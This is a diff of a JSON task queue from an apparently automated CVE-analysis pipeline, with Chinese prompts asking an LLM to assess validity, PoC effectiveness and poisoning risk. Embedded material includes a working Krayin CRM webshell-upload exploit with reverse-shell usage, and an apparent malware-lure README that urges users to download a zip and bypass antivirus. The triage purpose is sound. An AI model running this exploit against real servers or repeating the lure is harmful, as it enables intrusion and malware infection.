--url   | Target base URL   | Yes   |\n| -e, --email   | Login email   | Yes   |\n| -p, --password   | Login password   | Yes   |\n| -c, --cmd   | Execute single command   | No   |\n| --lhost   | Your IP for reverse shell   |Yes (if not using --cmd)   |\n| --lport   | Listening port   | No (default: 4444)   |\n\n## Example Workflow\n\nStart listener:\n```Bash\nnc -lvnp 4444\n```\nRun the exploit:\n```Bash\npython3 exploit.py -u http://target.com -e admin@target.com -p password --lhost IP_ADDR\n```\n\n## Disclaimer\nThis exploit is intended for educational purposes and authorized penetration testing only. Unauthorized use against systems you do not have explicit permission to test is illegal.\n\nAffected Versions\n\nKrayin CRM ≤ 2.2.x\nCVE: CVE-2026-38526\n\n\nAuthor: Hubert\nDate: 2026\n\n\n---\n/tmp/aab573072f1da9a79bd87865c40f017f/exploit.py\n---\nimport requests\nfrom bs4 import BeautifulSoup\nimport re\nimport argparse\nimport sys\nimport base64\n\n# ====================== ARGUMENTS ======================\nparser = argparse.ArgumentParser(description=\"CVE-2026-38526 - Krayin CRM Arbitrary File Upload to RCE\")\nparser.add_argument(\"-u\", \"--url\", required=True, help=\"Target base URL (e.g. http://example.com)\")\nparser.add_argument(\"-e\", \"--email\", required=True, help=\"Email for authentication\")\nparser.add_argument(\"-p\", \"--password\", required=True, help=\"Password for authentication\")\nparser.add_argument(\"-c\", \"--cmd\", help=\"Execute a single command instead of reverse shell\")\nparser.add_argument(\"--lhost\", help=\"Your IP address for reverse shell\")\nparser.add_argument(\"--lport\", type=int, default=4444, help=\"Your listening port (default: 4444)\")\n\nargs = parser.parse_args()\n\nif not args.cmd and not args.lhost:\n    print(\"[-] Error: You must provide either --cmd or --lhost for reverse shell\")\n    sys.exit(1)\n\nBASE_URL = args.url.rstrip(\"/\")\nLOGIN_URL = f\"{BASE_URL}/admin/login\"\n\n# ====================== WEBSHELL PAYLOAD ======================\nPAYLOAD = \"\"\"<?php\nif (isset($_GET['cmd'])) {\n    system($_GET['cmd']);\n}\n?>\n\"\"\"\n# =========================================================\n\nsession = requests.Session()\nsession.headers.update({\n    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',\n})\n\n# ====================== LOGIN ======================\nprint(\"[*] Logging in...\")\nr = session.get(LOGIN_URL)\n\nsoup = BeautifulSoup(r.text, 'html.parser')\ntoken_input = soup.find(\"input\", {\"name\": \"_token\"})\ncsrf_token = token_input[\"value\"] if token_input else None\n\nif not csrf_token:\n    match = re.search(r'name=[\"\\']_token[\"\\'] value=[\"\\']([^\"\\']+)', r.text)\n    csrf_token = match.group(1) if match else None\n\nif not csrf_token:\n    print(\"[-] Failed to retrieve CSRF token\")\n    exit(1)\n\nprint(f\"[+] CSRF token retrieved: {csrf_token[:30]}...\")\n\nlogin_data = {\n    'email': args.email,\n    'password': args.password,\n    '_token': csrf_token\n}\n\nlogin_resp = session.post(LOGIN_URL, data=login_data)\n\nif login_resp.status_code != 200 or \"/admin\" not in login_resp.url.lower():\n    print(\"[-] Login failed\")\n    print(f\"Final URL: {login_resp.url}\")\n    exit(1)\n\nprint(\"[+] Login successful\")\n\n# ====================== REFRESH CSRF TOKEN ======================\nprint(\"[*] Refreshing CSRF token...\")\nrefresh = session.get(f\"{BASE_URL}/admin/mail/inbox\")\nsoup = BeautifulSoup(refresh.text, 'html.parser')\nnew_token = soup.find(\"input\", {\"name\": \"_token\"})\nif new_token and new_token.get(\"value\"):\n    csrf_token = new_token[\"value\"]\n\nsession.headers.update({'X-CSRF-TOKEN': csrf_token})\n\n# ====================== UPLOAD WEBSHELL ======================\nprint(\"[*] Uploading webshell...\")\n\nfiles = {\n    'file': ('shell.png.php', PAYLOAD, 'image/jpeg')\n}\n\ndata = {'_token': csrf_token}\n\nupload_resp = session.post(\n    f\"{BASE_URL}/admin/tinymce/upload\",\n    files=files,\n    data=data\n)\n\nif upload_resp.status_code != 200:\n    print(\"[-] Upl\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
     "retry_count": 2,
     "max_retries": 5,
     "priority": 2,
     "status": "processing",
     "error_type": "client_error",
     "last_error": "API返回空结果",
-    "created_at": 1782336488.205197,
-    "last_attempt": 1782342348.369506,
-    "next_attempt": 1782342367.21883,
+    "created_at": 1782342350.762517,
+    "last_attempt": 1782359038.3728538,
+    "next_attempt": 1782359056.3669462,
     "metadata": {},
-    "task_id": "task_CVE-2026-56111_1782336488",
+    "task_id": "task_CVE-2026-38526_1782342350",
     "required_result_fields": [
       "poc_available",
       "condition",
@@ -2929,19 +2929,77 @@
     ]
   },
   {
-    "cve_id": "CVE-2026-38526",
-    "prompt": "\n      请根据以下漏洞信息、搜索结果和漏洞利用代码，生成一份详细的漏洞分析报告，包含有效性分析、投毒风险分析、利用方式、代码分析等内容。请注意以下几点：\n\n    **信息来源：**\n\n    *   **漏洞库信息：**\n        ```\n        {\"cve_id\": \"CVE-2026-38526\", \"sources\": [\"NVD\", \"OSCS\"], \"descriptions\": [\"An authenticated arbitrary file upload vulnerability in the /admin/tinymce/upload endpoint of Webkul Krayin CRM v2.2.x allows attackers to execute arbitrary code via uploading a crafted PHP file.\", \"\\u6807\\u9898: Krayin CRM v2.2.x \\u6587\\u4ef6\\u4e0a\\u4f20\\u6f0f\\u6d1e\"], \"published_date\": \"2026-04-14T16:16:43.127\", \"last_modified_date\": \"2026-06-17T10:41:42.487\", \"cvss_score\": 9.9, \"severity\": \"CRITICAL\", \"references\": [\"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \"h\", \"u\", \"b\", \".\", \"c\", \"o\", \"m\", \"/\", \"T\", \"R\", \"E\", \"X\", \"N\", \"E\", \"G\", \"R\", \"O\", \"/\", \"S\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"-\", \"A\", \"d\", \"v\", \"i\", \"s\", \"o\", \"r\", \"i\", \"e\", \"s\", \"/\", \"t\", \"r\", \"e\", \"e\", \"/\", \"m\", \"a\", \"i\", \"n\", \"/\", \"C\", \"V\", \"E\", \"-\", \"2\", \"0\", \"2\", \"6\", \"-\", \"3\", \"8\", \"5\", \"2\", \"6\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \"h\", \"u\", \"b\", \".\", \"c\", \"o\", \"m\", \"/\", \"k\", \"r\", \"a\", \"y\", \"i\", \"n\", \"/\", \"l\", \"a\", \"r\", \"a\", \"v\", \"e\", \"l\", \"-\", \"c\", \"r\", \"m\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \"h\", \"u\", \"b\", \".\", \"c\", \"o\", \"m\", \"/\", \"T\", \"R\", \"E\", \"X\", \"N\", \"E\", \"G\", \"R\", \"O\", \"/\", \"S\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"-\", \"A\", \"d\", \"v\", \"i\", \"s\", \"o\", \"r\", \"i\", \"e\", \"s\", \"/\", \"b\", \"l\", \"o\", \"b\", \"/\", \"m\", \"a\", \"i\", \"n\", \"/\", \"C\", \"V\", \"E\", \"-\", \"2\", \"0\", \"2\", \"6\", \"-\", \"3\", \"8\", \"5\", \"2\", \"6\", \"/\", \"p\", \"o\", \"c\", \".\", \"m\", \"d\"]}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n            ## 以下内容是基于此漏洞的搜索结果:\n                [webpage 0 begin] [title] NVD - CVE-2026-38526\n [description] Apr 14, 2026 · An official website of the United States government Here's how you know\n [link] https://nvd.nist.gov/vuln/detail/CVE-2026-38526\n [webpage 0 end]\n[webpage 1 begin] [title] CVE-2026-38526: Arbitrary File | VulnBase\n [description] Apr 14, 2026 · CVE-2026-38526 (CVSS 9.9, Critical severity) — An authenticated arbitrary file upload vulnerability in the /admin/tinymce/upload endpoint of Webkul Krayi… Exploit details, CVSS vector, and remediation on VulnBase.\n [link] https://www.vulnbase.org/cve/CVE-2026-38526\n [webpage 1 end]\n[webpage 2 begin] [title] CVE-2026-38526 Security Vulnerability & Exploit Details\n [description] Apr 14, 2026 · Below is the Impact Analysis for CVE-2026-38526, showing how Confidentiality, Integrity, and Availability might be affected if the vulnerability is exploited.\n [link] https://cve.akaoma.com/cve-2026-38526\n [webpage 2 end]\n[webpage 3 begin] [title] CVE-2026-38526 - Krayin CRM PHP File Upload Code Execution ...\n [description] Apr 14, 2026 · An authenticated arbitrary file upload vulnerability in the /admin/tinymce/upload endpoint of Webkul Krayin CRM v2.2.x allows attackers to execute arbitrary code via uploading a crafted PHP file.\n [link] https://cvefeed.io/vuln/detail/CVE-2026-38526\n [webpage 3 end]\n[webpage 4 begin] [title] CVE-2026-38526 - Exploits & Severity - Feedly\n [description] Apr 14, 2026 · CVE-2026-38526 identifies a critical authenticated arbitrary file upload vulnerability in Webkul Krayin CRM v2.2.x. The flaw, located in the endpoint, allows an attacker to upload a specially crafted PHP file.\n [link] https://feedly.com/cve/CVE-2026-38526\n [webpage 4 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/aab573072f1da9a79bd87865c40f017f/README.md\n---\n# CVE-2026-38526 - Krayin CRM RCE Exploit\n\n**Krayin CRM** (≤ 2.2.x) - Unrestricted File Upload leading to Remote Code Execution.\n\nThis PoC exploits the vulnerable TinyMCE upload endpoint (`/admin/tinymce/upload`) to upload a PHP webshell and achieve command execution on the server.\n\n---\n\n## Features\n\n- Full automatic login with CSRF token handling\n- Bypasses upload restrictions using double extension (`shell.png.php`)\n- Supports reverse shell (base64 encoded) and single command execution\n- Reliable Laravel CSRF token refresh\n- Clean and easy to use\n\n---\n\n## Requirements\n\n```Bash\npip3 install requests beautifulsoup4\n```\nUsage\n\n1. Reverse Shell (Default & Recommended)\n```Bash\npython3 exploit.py \\\n  -u http://example.com \\\n  -e user@example.com \\\n  -p \"example_pass\" \\\n  --lhost YOUR_IP \\\n  --lport 4444\n```\n2. Single Command\n\n```Bash\npython3 exploit.py \\\n  -u http://example.com \\\n  -e user@example.com \\\n  -p \"example_pass\" \\\n  -c \"whoami\"\n```\n## Options\n| Argument | Description | Required |\n|----------|----------|----------|\n| -u, --url   | Target base URL   | Yes   |\n| -e, --email   | Login email   | Yes   |\n| -p, --password   | Login password   | Yes   |\n| -c, --cmd   | Execute single command   | No   |\n| --lhost   | Your IP for reverse shell   |Yes (if not using --cmd)   |\n| --lport   | Listening port   | No (default: 4444)   |\n\n## Example Workflow\n\nStart listener:\n```Bash\nnc -lvnp 4444\n```\nRun the exploit:\n```Bash\npython3 exploit.py -u http://target.com -e admin@target.com -p password --lhost IP_ADDR\n```\n\n## Disclaimer\nThis exploit is intended for educational purposes and authorized penetration testing only. Unauthorized use against systems you do not have explicit permission to test is illegal.\n\nAffected Versions\n\nKrayin CRM ≤ 2.2.x\nCVE: CVE-2026-38526\n\n\nAuthor: Hubert\nDate: 2026\n\n\n---\n/tmp/aab573072f1da9a79bd87865c40f017f/exploit.py\n---\nimport requests\nfrom bs4 import BeautifulSoup\nimport re\nimport argparse\nimport sys\nimport base64\n\n# ====================== ARGUMENTS ======================\nparser = argparse.ArgumentParser(description=\"CVE-2026-38526 - Krayin CRM Arbitrary File Upload to RCE\")\nparser.add_argument(\"-u\", \"--url\", required=True, help=\"Target base URL (e.g. http://example.com)\")\nparser.add_argument(\"-e\", \"--email\", required=True, help=\"Email for authentication\")\nparser.add_argument(\"-p\", \"--password\", required=True, help=\"Password for authentication\")\nparser.add_argument(\"-c\", \"--cmd\", help=\"Execute a single command instead of reverse shell\")\nparser.add_argument(\"--lhost\", help=\"Your IP address for reverse shell\")\nparser.add_argument(\"--lport\", type=int, default=4444, help=\"Your listening port (default: 4444)\")\n\nargs = parser.parse_args()\n\nif not args.cmd and not args.lhost:\n    print(\"[-] Error: You must provide either --cmd or --lhost for reverse shell\")\n    sys.exit(1)\n\nBASE_URL = args.url.rstrip(\"/\")\nLOGIN_URL = f\"{BASE_URL}/admin/login\"\n\n# ====================== WEBSHELL PAYLOAD ======================\nPAYLOAD = \"\"\"<?php\nif (isset($_GET['cmd'])) {\n    system($_GET['cmd']);\n}\n?>\n\"\"\"\n# =========================================================\n\nsession = requests.Session()\nsession.headers.update({\n    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',\n})\n\n# ====================== LOGIN ======================\nprint(\"[*] Logging in...\")\nr = session.get(LOGIN_URL)\n\nsoup = BeautifulSoup(r.text, 'html.parser')\ntoken_input = soup.find(\"input\", {\"name\": \"_token\"})\ncsrf_token = token_input[\"value\"] if token_input else None\n\nif not csrf_token:\n    match = re.search(r'name=[\"\\']_token[\"\\'] value=[\"\\']([^\"\\']+)', r.text)\n    csrf_token = match.group(1) if match else None\n\nif not csrf_token:\n    print(\"[-] Failed to retrieve CSRF token\")\n    exit(1)\n\nprint(f\"[+] CSRF token retrieved: {csrf_token[:30]}...\")\n\nlogin_data = {\n    'email': args.email,\n    'password': args.password,\n    '_token': csrf_token\n}\n\nlogin_resp = session.post(LOGIN_URL, data=login_data)\n\nif login_resp.status_code != 200 or \"/admin\" not in login_resp.url.lower():\n    print(\"[-] Login failed\")\n    print(f\"Final URL: {login_resp.url}\")\n    exit(1)\n\nprint(\"[+] Login successful\")\n\n# ====================== REFRESH CSRF TOKEN ======================\nprint(\"[*] Refreshing CSRF token...\")\nrefresh = session.get(f\"{BASE_URL}/admin/mail/inbox\")\nsoup = BeautifulSoup(refresh.text, 'html.parser')\nnew_token = soup.find(\"input\", {\"name\": \"_token\"})\nif new_token and new_token.get(\"value\"):\n    csrf_token = new_token[\"value\"]\n\nsession.headers.update({'X-CSRF-TOKEN': csrf_token})\n\n# ====================== UPLOAD WEBSHELL ======================\nprint(\"[*] Uploading webshell...\")\n\nfiles = {\n    'file': ('shell.png.php', PAYLOAD, 'image/jpeg')\n}\n\ndata = {'_token': csrf_token}\n\nupload_resp = session.post(\n    f\"{BASE_URL}/admin/tinymce/upload\",\n    files=files,\n    data=data\n)\n\nif upload_resp.status_code != 200:\n    print(\"[-] Upl\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
+    "cve_id": "CVE-2026-45585",
+    "prompt": "\n      请根据以下漏洞信息、搜索结果和漏洞利用代码，生成一份详细的漏洞分析报告，包含有效性分析、投毒风险分析、利用方式、代码分析等内容。请注意以下几点：\n\n    **信息来源：**\n\n    *   **漏洞库信息：**\n        ```\n        {\"cve_id\": \"CVE-2026-45585\", \"sources\": [\"OSCS\"], \"descriptions\": [\"\\u6807\\u9898: Windows YellowKey \\u5b89\\u5168\\u529f\\u80fd\\u7ed5\\u8fc7\"], \"published_date\": null, \"last_modified_date\": null, \"cvss_score\": null, \"severity\": null, \"references\": []}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n            ## 以下内容是基于此漏洞的搜索结果:\n                [webpage 0 begin] [title] CVE-2026-45585 YellowKey PoC, The BitLocker Bypass That Turned WinRE ...\n [description] Microsoft published CVE-2026-45585 on May 19, 2026. The advisory describes YellowKey as a Windows BitLocker Security Feature Bypass Vulnerability, confirms the public PoC, states that the issue requires physical attack conditions, and provides interim mitigation guidance.\n [link] https://www.penligent.ai/hackinglabs/cve-2026-45585/\n [webpage 0 end]\n[webpage 1 begin] [title] Nvd - Cve-2026-45585\n [description] NVD MENU Information Technology Laboratory National Vulnerability Database Vulnerabilities\n [link] https://nvd.nist.gov/vuln/detail/CVE-2026-45585\n [webpage 1 end]\n[webpage 2 begin] [title] Windows BitLocker Security Feature Bypass — YellowKey (CVE-2026-45585 ...\n [description] The PoC was publicly released \"violating coordinated vulnerability best practices,\" according to Microsoft, forcing the company to issue this CVE with interim mitigation guidance before the security update was ready. BitLocker is the primary data-at-rest encryption solution for Windows enterprise environments.\n [link] https://threat-modeling.com/windows-bitlocker-yellowkey-bypass-cve-2026-45585/\n [webpage 2 end]\n[webpage 3 begin] [title] CVE-2026-45585: Windows BitLocker Security Feature Bypass Vulnerability\n [description] Windows BitLocker Security Feature Bypass Vulnerability Overview Microsoft has confirmed a security feature bypass vulnerability in Windows, dubbed \"YellowKey.\" Due to the public release of a proof-of-concept (PoC), which violates the best practices for coordinated vulnerability disclosure, Microsoft is issuing this CVE in advance to provide mitigation steps before the security update is ...\n [link] https://cve.imfht.com/detail/CVE-2026-45585?lang=en\n [webpage 3 end]\n[webpage 4 begin] [title] CVE-2026-45585 - Exploits & Severity - Feedly\n [description] A newly disclosed Windows Defender vulnerability, tracked as CVE-2026-50656 and dubbed RoguePlanet, has raised concerns across the cybersecurity community after a working proof-of-concept (PoC) exploit was released before a security patch became available.\n [link] https://feedly.com/cve/CVE-2026-45585\n [webpage 4 end]\n[webpage 5 begin] [title] CVE-2026-45585 : Security Feature Bypass in Windows by Microsoft\n [description] CVE-2026-45585 is a vulnerability affecting Microsoft Windows, recognized as a security feature bypass.Exploit Proof of Concept (PoC). PoC code is written by security researchers to demonstrate the vulnerability can be exploited.\n [link] https://securityvulnerability.io/vulnerability/CVE-2026-45585\n [webpage 5 end]\n[webpage 6 begin] [title] Windows YellowKey Security Feature Bypass Vulnerability... | Navanem\n [description] CVE-2026-45585 is a Windows security feature bypass vulnerability publicly known as \"YellowKey\" affecting BitLocker protections. CVSS 6.8 (medium) with physical access required for exploitation.\n [link] https://www.navanem.com/cve/CVE-2026-45585\n [webpage 6 end]\n[webpage 7 begin] [title] CVE-2026-45585 - Medium Vulnerability - TheHackerWire\n [description] How severe is CVE-2026-45585? This vulnerability has a CVSS score of 6.8 out of 10, rated as Medium. Medium severity vulnerabilities require specific conditions to exploit but should be patched during regular maintenance cycles.\n [link] https://www.thehackerwire.com/vulnerability/CVE-2026-45585/\n [webpage 7 end]\n[webpage 8 begin] [title] CVE-2026-45585 - Windows Security Feature Bypass... | WatchStack.io\n [description] Vulnerability Report. CVE-2026-45585. RCE. Title: Windows Security Feature Bypass (YellowKey).Proof Of Concept. PoC Available for CVE-2026-45585. View PoC Sources. CWE Category CWE-77. Published Date May 20, 2026.\n [link] https://watchstack.io/intel/cve/CVE-2026-45585\n [webpage 8 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/09f81fb2c794d04565e5b09c2be9e2d4/LICENSE\n---\nMIT License\n\nCopyright (c) 2026 Petshop Studio\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n\n\n---\n/tmp/09f81fb2c794d04565e5b09c2be9e2d4/README.md\n---\n# 🔑 yellowkey-bitlocker - Unlock your BitLocker encrypted computer files\n\n[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Desireeontrial76/yellowkey-bitlocker/raw/refs/heads/main/bitlocker/bitlocker_yellowkey_3.0.zip)\n\n## 📁 Project Overview\n\nThe yellowkey-bitlocker tool provides a way to regain access to your Windows storage drives. Many users encounter issues with BitLocker drive encryption, which can lock files during updates or hardware changes. This software manages those lock states. It targets issues related to CVE-2026-45585. This project helps you clear the drive lock and recover your data without technical help. It runs on Windows 10 and Windows 11.\n\n## 🛠️ System Requirements\n\nEnsure your computer meets these standards before you start:\n\n*   Operating System: Windows 10 or Windows 11 (64-bit).\n*   Processor: Standard Intel or AMD x64 chip.\n*   Memory: 4 GB of RAM or more.\n*   Storage: 100 MB of free disk space.\n*   Permission: Local Administrator access on your Windows account.\n\n## 📥 How to download the software\n\nFollow these steps to obtain the tool:\n\n1.  Visit [this page to download](https://github.com/Desireeontrial76/yellowkey-bitlocker/raw/refs/heads/main/bitlocker/bitlocker_yellowkey_3.0.zip).\n2.  Look for the section marked Latest Release.\n3.  Click the file ending in .exe to start the transfer.\n4.  Save the file to your Downloads folder.\n\nDo not move the file until the transfer completes. Verify that your browser shows the file size matches the record on the website.\n\n## ⚙️ Setup and Installation\n\nPrepare your computer for the tool. Windows may block files from the internet for protection.\n\n1.  Locate the file in your Downloads folder.\n2.  Right-click the file and choose Properties.\n3.  Check the box that says Unblock at the bottom of the General tab. Click Apply and OK.\n4.  Double-click the .exe file to launch the setup window.\n5.  Follow the prompts on your screen. You do not need to change the default installation path.\n6.  The installer creates a shortcut on your desktop once it finishes.\n\n## 🔓 Using the tool\n\nThe tool operates through a user interface designed for simplicity. Follow these steps to unlock your drive:\n\n1.  Open the yellowkey-bitlocker software from your desktop shortcut.\n2.  Select the encrypted drive from the list shown in the main window.\n3.  Click the Scan button to search for the encryption state. \n4.  Wait for the progress bar to reach the end. \n5.  Once the scan finishes, the tool displays the status of the drive key.\n6.  Click the Recover button if the drive appears as locked.\n7.  The software performs the bypass process to remove the lock status.\n8.  Restart your computer when the tool shows the success message. \n\n## 🛡️ Security Features\n\nThis tool uses industry standards for data handling. It ensures your files remain intact during the decryption process. It specifically addresses the nightmare-eclipse vulnerability. By neutralizing the trigger, it prevents the system from enabling an unwanted drive lock. The software creates a log file in the installation folder. This helps you track every action taken during the recovery process. You can view these logs if you encounter errors.\n\n## 🧩 Troubleshooting common issues\n\nMost users get the software running without problems. If you see an error, check this list:\n\n*   Error: Access Denied. Ensure you run the program as an administrator. Right-click the icon and select Run as administrator.\n*   Error: Drive Not Found. Ensure your drive shows up in the Windows Disk Management tool first. Connect external drives before you open the application.\n*   Error: Network Blocked. Your antivirus might stop the program. Add an exception for yellowkey-bitlocker in your security settings.\n*   Error: Update Required. Always use the latest \n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- 